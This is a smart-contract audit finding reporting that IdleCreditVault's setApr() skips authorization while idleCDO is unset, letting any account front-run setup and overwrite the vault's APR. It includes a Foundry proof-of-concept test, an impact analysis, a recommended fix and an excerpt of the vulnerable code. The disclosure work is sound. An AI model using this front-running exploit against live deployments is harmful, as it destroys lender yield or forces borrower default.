### Title
Unconfigured `idleCDO` allows any account to overwrite the credit-vault APR - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` leaves `idleCDO` unset until the owner separately calls `setWhitelistedCDO`, while `setApr()` skips its authorization check whenever `idleCDO == address(0)`. An unprivileged attacker can therefore front-run the CDO-wiring transaction and silently replace the intended fixed APR with either `0` or the `20e18` cap. The malformed rate is then used as the borrower-facing epoch interest rate, causing loss of lender yield or an artificially insolvent epoch.

### Finding Description
`IdleCreditVault.initialize()` stores the underlying token, manager, borrower and initial APR, but does not initialize `idleCDO`, leaving it at the zero address. [1](#0-0) 

`setAprs()` and `setAprsWithBuffer()` are public and forward to `setApr()`. [2](#0-1) 

Inside `setApr()`, the caller check only runs after `idleCDO` has been configured:

```solidity
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
```

Consequently, while `idleCDO` is still zero, any EOA can set `unscaledApr` and `lastApr` to any value up to `maxApr`, which defaults to `20e18`. [3](#0-2) [4](#0-3) 

The later owner call to `setWhitelistedCDO()` only writes `idleCDO`; it does not validate or restore the APR. [5](#0-4) 

For a non-atomic deployment, the sequence is:

1. Deploy and initialize `IdleCreditVault` with the intended APR.
2. The attacker front-runs `setWhitelistedCDO()` and calls `setAprs(maliciousUnscaledApr, maliciousScaledApr)`.
3. The owner wires the CDO.
4. Users deposit and the epoch runs under the attacker-selected APR.

A zero APR converts the credit facility into an interest-free loan and removes the yield for which lenders deposited principal. A maximum APR instead creates a borrower obligation of up to `20x` annualized interest before epoch scaling, which can make an otherwise healthy pool unable to satisfy `stopEpoch` accounting and force the default/recovery path. [4](#0-3) [3](#0-2) 

### Impact Explanation
For principal `P`, intended APR `r`, and epoch duration `t`, setting the APR to zero destroys approximately `P * r * t / YEAR` of lender yield. Setting the APR to `DEFAULT_MAX_APR` can instead demand approximately `P * 20 * t / YEAR`, creating artificial borrower insolvency and exposing active tranche holders and withdrawal receipts to the default waterfall and recovery haircut. [6](#0-5) [4](#0-3) 

The loss is protocol accounting loss rather than a merely cosmetic configuration error because `lastApr` is returned as the vault APR and `unscaledApr` also controls the APR0 withdrawal-accounting branch. [7](#0-6) [8](#0-7) 

### Likelihood Explanation
The exploit requires a deployment flow where `initialize()` and `setWhitelistedCDO()` are separate transactions. `IdleCreditVaultFactory` performs initialization, APR configuration and CDO whitelisting atomically, so factory deployments are not exposed to the front-running window. [9](#0-8) 

However, both `initialize()` and `setWhitelistedCDO()` are externally callable production entry points, and the code explicitly supports a setup period with `idleCDO` unset. Any manual proxy deployment or delayed post-deployment wiring is exposed to an unprivileged front-runner. [10](#0-9) [3](#0-2) 

### Recommendation
Do not leave APR mutable during the uninitialized-CDO setup window. Require `idleCDO` to be supplied atomically during `initialize()`, or make `setApr()` always require `msg.sender == manager || msg.sender == idleCDO` without skipping authorization when `idleCDO == address(0)`. At minimum, `setWhitelistedCDO()` should be restricted to the first wiring call and should validate that `lastApr` and `unscaledApr` still equal the initializer-supplied values. [3](#0-2) [5](#0-4) 

### Proof of Concept
The following Foundry PoC demonstrates the authorization bypass. In a fork test, use a real underlying such as USDC and a `TransparentUpgradeableProxy`; the essential sequence is initialization, attacker APR overwrite, then owner CDO wiring.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/IdleCDOCreditVault.sol";

contract IdleCreditVaultAprSetupPoC is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address owner = address(0x100);
    address proxyAdmin = address(0x101);
    address manager = address(0x102);
    address borrower = address(0x103);
    address attacker = address(0xBAD);

    uint256 intendedApr = 10e18; // 10% APR

    function test_UnconfiguredCDOAllowsAttackerAprOverwrite() public {
        IdleCreditVault strategyImpl = new IdleCreditVault();

        IdleCreditVault strategy = IdleCreditVault(address(
            new TransparentUpgradeableProxy(
                address(strategyImpl),
                proxyAdmin,
                abi.encodeWithSelector(
                    IdleCreditVault.initialize.selector,
                    USDC,
                    owner,
                    manager,
                    borrower,
                    "Borrower",
                    intendedApr
                )
            )
        ));

        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.lastApr(), intendedApr);
        assertEq(strategy.unscaledApr(), intendedApr);

        // Attacker front-runs the owner's setWhitelistedCDO transaction.
        vm.prank(attacker);
        strategy.setAprs(0, 0);

        assertEq(strategy.lastApr(), 0);
        assertEq(strategy.unscaledApr(), 0);

        // The CDO is wired later, but the malicious APR remains active.
        vm.prank(owner);
        strategy.setWhitelistedCDO(address(0xCD0));

        assertEq(strategy.idleCDO(), address(0xCD0));
        assertEq(strategy.lastApr(), 0);
        assertEq(strategy.unscaledApr(), 0);
    }
}
```

A variation replacing the zero APR with `strategy.setAprs(0, strategy.DEFAULT_MAX_APR())` shows the opposite malformed state: the configured `lastApr` becomes `20e18`, creating a borrower repayment requirement far above the intended `10e18` APR. [4](#0-3) [11](#0-10)

  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
